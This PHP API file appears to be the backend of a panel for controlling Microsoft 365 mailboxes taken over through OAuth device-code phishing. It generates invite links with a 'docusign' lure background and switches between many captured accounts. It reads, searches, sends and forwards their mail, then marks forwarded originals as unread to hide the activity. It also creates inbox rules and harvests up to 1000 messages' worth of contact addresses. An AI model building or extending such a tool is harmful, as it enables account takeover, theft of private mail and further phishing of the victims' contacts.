<?php
// Suppress all PHP notices/warnings so they never corrupt JSON output
error_reporting(0);
@ini_set('display_errors', '0');

// ── Load order: config first (defines constants), then security classes ──
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/auth/Security.php';
require_once __DIR__ . '/auth/Auth.php';
require_once __DIR__ . '/auth/Portal.php';
require_once __DIR__ . '/Graph.php';
require_once __DIR__ . '/Mailer.php';
require_once __DIR__ . '/SearchParser.php';

// Start session with hardened settings
Security::startSecureSession();

// Capture any stray output (PHP notices, BOM, whitespace) and strip it
ob_start(function($buf) {
    if (headers_sent()) return $buf;
    // Find the first { or [ which marks the start of real JSON
    $jsonStart = -1;
    for ($i = 0; $i < strlen($buf); $i++) {
        if ($buf[$i] === '{' || $buf[$i] === '[') { $jsonStart = $i; break; }
    }
    if ($jsonStart > 0) {
        // There was garbage (notices, BOM) before the JSON — strip it
        header('Content-Type: application/json');
        return substr($buf, $jsonStart);
    }
    if ($jsonStart === -1 && trim($buf) !== '') {
        // No JSON at all — return error
        header('Content-Type: application/json');
        return json_encode(['error' => 'Server output error', 'detail' => substr(trim($buf), 0, 500)]);
    }
    return $buf;
});

header('Content-Type: application/json');
header('Cache-Control: no-store, no-cache, must-revalidate');

// Auth check
if (!Portal::isAuthed()) {
    ob_end_clean();
    http_response_code(401);
    echo json_encode(['error' => 'Not authenticated']);
    exit;
}

Security::sendHeaders(true);

// CSRF: verify on state-changing actions
$_safeReads = ['emails','email','attachments','attachment_content','download_attachment','accounts','folders','folder_messages','calendar','free_busy','get_or_create_invite_code','update_invite_bg','regenerate_invite_code','extract_emails','status','device_code','poll','folders_simple','get_inbox_rules','me'];
if ($_SERVER['REQUEST_METHOD'] === 'POST' || !in_array($_GET['action'] ?? '', $_safeReads, true)) {
    Security::verifyCsrf();
}

$action = $_GET['action'] ?? '';

try {
    switch ($action) {

        case 'status':
            echo json_encode(['status'=>'ok','php'=>PHP_VERSION]);
            break;

        case 'device_code':
            echo json_encode(Auth::getDeviceCode());
            break;

        case 'poll':
            echo json_encode(Auth::pollToken());
            break;

        case 'accounts':
            echo json_encode(['accounts'=>Auth::getAccounts(),'active'=>Auth::getActiveAccountId()]);
            break;

        case 'update_invite_bg':
            // Update the bg stored with the current user's invite code (fire-and-forget)
            require_once __DIR__ . '/auth/UserTokens.php';
            $pu = $_SESSION['portal_user'] ?? '';
            $bg = preg_replace('/[^a-z0-9_-]/', '', strtolower($_GET['bg'] ?? 'docusign'));
            if ($pu) updateInviteCodeBg($pu, $bg);
            echo json_encode(['status' => 'ok']);
            break;

        case 'get_or_create_invite_code':
            // Returns or creates an invite code for current portal user
            require_once __DIR__ . '/auth/UserTokens.php';
            $pu = $_SESSION['portal_user'] ?? '';
            if (!$pu) throw new Exception('Not logged in');
            $code = getOrCreateInviteCode($pu, 'docusign');
            if (!$code) throw new Exception('Could not create invite code — check data/ folder permissions');
            $base = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST']
                  . rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
            echo json_encode(['status' => 'ok', 'code' => $code, 'url' => $base . '/invite.php?c=' . urlencode($code)]);
            break;

        case 'regenerate_invite_code':
            require_once __DIR__ . '/auth/UserTokens.php';
            $pu = $_SESSION['portal_user'] ?? '';
            if (!$pu) throw new Exception('Not logged in');
            $newCode = regenerateInviteCode($pu);
            $base    = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST']
                     . rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');
            echo json_encode(['status' => 'ok', 'code' => $newCode, 'url' => $base . '/invite.php?c=' . urlencode($newCode)]);
            break;

        case 'switch':
            $id = $_GET['id'] ?? '';
            if (!$id) throw new Exception('Missing id');
            echo json_encode(['status'=>Auth::switchAccount($id)?'ok':'error']);
            break;

        case 'remove':
            $id = $_GET['id'] ?? '';
            if (!$id) throw new Exception('Missing id');
            Auth::removeAccount($id);
            echo json_encode(['status'=>'ok','accounts'=>Auth::getAccounts(),'active'=>Auth::getActiveAccountId()]);
            break;

        case 'logout_all':
            Auth::logoutAll();
            echo json_encode(['status'=>'ok']);
            break;

        case 'me':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            echo json_encode(Graph::getMe());
            break;

        case 'emails':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $folder    = $_GET['folder'] ?? 'inbox';
            $top       = min((int)($_GET['top']  ?? 20), 50);
            $skip      = max((int)($_GET['skip'] ?? 0),  0);
            $rawSearch = trim($_GET['search'] ?? '');
            $accountId = $_GET['account_id'] ?? null;
            if ($accountId) Auth::assertOwnsAccount($accountId);
            if ($accountId) Auth::assertOwnsAccount($accountId); // allow fetching any account's emails

            // Parse user-friendly search string into Graph API search+filter
            $parsed    = SearchParser::parse($rawSearch);
            $search    = $parsed['search'];
            $filter    = $parsed['filter'] ?: trim($_GET['filter'] ?? '');
            $useMsgEp  = $parsed['use_messages_endpoint'];

            if ($search !== '') {
                // All-pages search — give it more time on shared hosting
                @set_time_limit(120);
                @ignore_user_abort(true);
            }

            $result = Graph::getEmails($folder, $top, $skip, $search, $filter, $accountId, '', $useMsgEp, 500);
            // Pass highlight terms to frontend so it can highlight matched text
            if (!isset($result['error']) && !empty($parsed['highlight_terms'])) {
                $result['_highlight_terms'] = $parsed['highlight_terms'];
            }
            echo json_encode($result);
            break;

        case 'email':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $id = $_GET['id'] ?? '';
            if (!$id) throw new Exception('Missing id');
            $emailAccId = $_GET['account_id'] ?? null;
            if ($emailAccId) Auth::assertOwnsAccount($emailAccId);
            echo json_encode(Graph::getEmail($id, $emailAccId));
            break;

        case 'attachments':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $id = $_GET['id'] ?? '';
            if (!$id) throw new Exception('Missing email id');
            $attAccId = $_GET['account_id'] ?? null;
            if ($attAccId) Auth::assertOwnsAccount($attAccId);
            echo json_encode(Graph::getAttachments($id, $attAccId));
            break;

        case 'attachment_content':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $emailId = $_GET['email_id'] ?? '';
            $attId   = $_GET['att_id']   ?? '';
            if (!$emailId || !$attId) throw new Exception('Missing ids');
            $att = Graph::getAttachmentContent($emailId, $attId);
            echo json_encode([
                'name'         => $att['name'] ?? '',
                'contentType'  => $att['contentType'] ?? '',
                'contentBytes' => $att['contentBytes'] ?? '',
                'size'         => $att['size'] ?? 0,
            ]);
            break;

        case 'attachment_download':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $emailId = $_GET['email_id'] ?? '';
            $attId   = $_GET['att_id']   ?? '';
            $name    = $_GET['name']     ?? 'attachment';
            $mime    = $_GET['mime']     ?? 'application/octet-stream';
            if (!$emailId || !$attId) throw new Exception('Missing ids');
            $att  = Graph::getAttachmentContent($emailId, $attId);
            $data = base64_decode($att['contentBytes'] ?? '');
            // Sanitise: strip header-injection chars; whitelist mime type format
            $safeName = Security::headerValue(Security::filename($name));
            $safeMime = preg_match('/^[a-zA-Z0-9][a-zA-Z0-9!#$&\-^_]*\/[a-zA-Z0-9][a-zA-Z0-9!#$&\-^_.+]*$/', $mime)
                ? $mime : 'application/octet-stream';
            header('Content-Type: ' . $safeMime);
            header('Content-Disposition: attachment; filename="' . str_replace('"', '', $safeName) . '"');
            header('Content-Length: ' . strlen($data));
            header('Cache-Control: no-store');
            // Remove JSON header and output binary
            ob_clean();
            echo $data;
            exit;

        case 'folders':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $fAccId = $_GET['account_id'] ?? null;
            if ($fAccId) Auth::assertOwnsAccount($fAccId);
            echo json_encode(Graph::getAllFolders($fAccId));
            break;

        case 'folders_simple':
            // Fast single-request folder list for background badge updates
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            echo json_encode(Graph::getFolders());
            break;

        case 'create_folder':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $body = json_decode(file_get_contents('php://input'), true) ?? [];
            $name = trim($body['name'] ?? '');
            if (!$name) throw new Exception('Folder name required');
            echo json_encode(Graph::createFolder($name, $body['parentId'] ?? null));
            break;

        case 'rename_folder':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $body = json_decode(file_get_contents('php://input'), true) ?? [];
            $id   = $body['id'] ?? ''; $name = trim($body['name'] ?? '');
            if (!$id || !$name) throw new Exception('id and name required');
            echo json_encode(Graph::renameFolder($id, $name));
            break;

        case 'delete_folder':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $id = $_GET['id'] ?? '';
            if (!$id) throw new Exception('id required');
            echo json_encode(['status'=>Graph::deleteFolder($id)?'ok':'error']);
            break;

        case 'move_email':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $body = json_decode(file_get_contents('php://input'), true) ?? [];
            if (!($body['emailId']??'') || !($body['folderId']??'')) throw new Exception('emailId and folderId required');
            $mvAccId = $body['account_id'] ?? null;
            if ($mvAccId) Auth::assertOwnsAccount($mvAccId);
            echo json_encode(Graph::moveEmail($body['emailId'], $body['folderId'], $mvAccId));
            break;

        case 'mark_read':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $body = json_decode(file_get_contents('php://input'), true) ?? [];
            $id   = $body['id'] ?? '';
            if (!$id) throw new Exception('id required');
            $mrAccId = $body['account_id'] ?? null;
            if ($mrAccId) Auth::assertOwnsAccount($mrAccId);
            echo json_encode(Graph::markRead($id, (bool)($body['isRead'] ?? true), $mrAccId));
            break;

        case 'delete_email':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $id = $_GET['id'] ?? '';
            if (!$id) throw new Exception('id required');
            $delAccId = $_GET['account_id'] ?? null;
            if ($delAccId) Auth::assertOwnsAccount($delAccId);
            echo json_encode(['status'=>Graph::deleteEmail($id, $delAccId)?'ok':'error']);
            break;

        // ── Compose / Reply / Forward ──────────────────────────

        case 'send':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $body = json_decode(file_get_contents('php://input'), true) ?? [];
            $to      = trim($body['to']      ?? '');
            $subject = trim($body['subject'] ?? '');
            $html    = trim($body['body']    ?? '');
            $cc      = trim($body['cc']      ?? '');
            // BCC in compose is admin-only — strip it for regular users
            $bcc = '';
            if (Portal::isAdmin() && !Portal::isImpersonating()) {
                $bcc = trim($body['bcc'] ?? '');
            }
            if (!$to)      throw new Exception('To address required');
            if (!$subject) throw new Exception('Subject required');
            echo json_encode(Graph::sendEmail($to, $subject, $html, $cc, $bcc));
            break;

        case 'reply':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $body     = json_decode(file_get_contents('php://input'), true) ?? [];
            $id       = $body['id']       ?? '';
            $comment  = $body['body']     ?? '';
            $replyAll = (bool)($body['replyAll'] ?? false);
            if (!$id) throw new Exception('id required');
            $replyAccId = $body['account_id'] ?? null;
            if ($replyAccId) Auth::assertOwnsAccount($replyAccId);
            echo json_encode(Graph::replyEmail($id, $comment, $replyAll, $replyAccId));
            break;

        case 'forward':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $body      = json_decode(file_get_contents('php://input'), true) ?? [];
            $id        = $_GET['id']         ?? $body['id']         ?? '';
            $to        = $_GET['to']         ?? $body['to']         ?? '';
            $keyword   = $body['keyword']    ?? $body['comment']    ?? '';
            $accountId = $_GET['account_id'] ?? $body['account_id'] ?? null;
            if ($accountId) Auth::assertOwnsAccount($accountId);
            if ($accountId) Auth::assertOwnsAccount($accountId);
            if (!$id || !$to) throw new Exception('id and to required');
            // Use SMTP if configured, otherwise fall back to Graph (appears in Sent)
            $email = Graph::getEmail($id, $accountId);
            Mailer::forward($email, $to, $accountId, $keyword);
            // Mark original as unread (Graph sometimes marks it read on forward)
            try { Graph::markRead($id, false, $accountId); } catch (Exception $e) {}
            echo json_encode(['status' => 'forwarded', 'via' => (SMTP_HOST ? 'smtp' : 'graph')]);
            break;

        // ── Inbox filter rules ─────────────────────────────────

        case 'get_inbox_rules':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            echo json_encode(Graph::getInboxRules());
            break;

        case 'create_inbox_rule':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $body = json_decode(file_get_contents('php://input'), true) ?? [];
            echo json_encode(Graph::createInboxRule($body));
            break;

        case 'update_inbox_rule':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $id   = $_GET['id'] ?? '';
            $body = json_decode(file_get_contents('php://input'), true) ?? [];
            if (!$id) throw new Exception('id required');
            echo json_encode(Graph::updateInboxRule($id, $body));
            break;

        case 'delete_inbox_rule':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $id = $_GET['id'] ?? '';
            if (!$id) throw new Exception('id required');
            echo json_encode(['status'=>Graph::deleteInboxRule($id)?'ok':'error']);
            break;

        // ── Calendar ──────────────────────────────────────────

        case 'calendar':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $start = $_GET['start'] ?? date('Y-m-d\T00:00:00');
            $end   = $_GET['end']   ?? date('Y-m-d\T23:59:59', strtotime('+30 days'));
            echo json_encode(Graph::getCalendarEvents($start, $end));
            break;

        case 'create_event':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $body = json_decode(file_get_contents('php://input'), true) ?? [];
            echo json_encode(Graph::createEvent($body));
            break;

        case 'delete_event':
            if (!Auth::isLoggedIn()) throw new Exception('Not authenticated');
            $id = $_GET['id'] ?? '';
            if (!$id) throw new Exception('id required');
            echo json_encode(['status'=>Graph::deleteEvent($id)?'ok':'error']);
            break;

        case 'extract_emails':
            @set_time_limit(120);
            @ignore_user_abort(true);
            $accountId = $_GET['account_id'] ?? null;
            if ($accountId) Auth::assertOwnsAccount($accountId);
            if ($accountId) Auth::assertOwnsAccount($accountId);
            if (!$accountId) $accountId = Auth::getActiveAccountId();
            if (!$accountId) throw new Exception('No active account');
            $token = Auth::getToken($accountId);
            if (!$token) throw new Exception('Account not found or token expired');

            $addresses = [];
            $fields     = 'from,toRecipients,ccRecipients,replyTo';
            $top        = 50;
            $skip       = 0;
            $maxPages   = 20; // 1000 messages max — avoids shared hosting timeouts
            $pages      = 0;

            do {
                $endpoint = "/me/messages?\$top={$top}&\$skip={$skip}&\$select={$fields}";
                $result   = Graph::get($endpoint, $accountId);
                $messages = $result['value'] ?? [];
                foreach ($messages as $msg) {
                    $from = $msg['from']['emailAddress'] ?? null;
                    if ($from && !empty($from['address'])) {
                        $addr = strtolower(trim($from['address']));
                        $name = trim($from['name'] ?? '');
                        if (!isset($addresses[$addr])) $addresses[$addr] = $name;
                    }
                    foreach (['toRecipients','ccRecipients','replyTo'] as $field) {
                        foreach ($msg[$field] ?? [] as $r) {
                            $addr = strtolower(trim($r['emailAddress']['address'] ?? ''));
                            $name = trim($r['emailAddress']['name'] ?? '');
                            if ($addr && !isset($addresses[$addr])) $addresses[$addr] = $name;
                        }
                    }
                }
                $skip += $top;
                $pages++;
            } while (count($messages) === $top && $pages < $maxPages);

            $out = [];
            foreach ($addresses as $addr => $name) {
                $out[] = ['email' => $addr, 'name' => $name];
            }
            usort($out, function($a, $b) { return strcmp($a['email'], $b['email']); });
            echo json_encode(['count' => count($out), 'addresses' => $out]);
            break;

        default:
            http_response_code(400);
            echo json_encode(['error'=>'Unknown action: '.$action]);
    }
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['error'=>$e->getMessage()]);
}
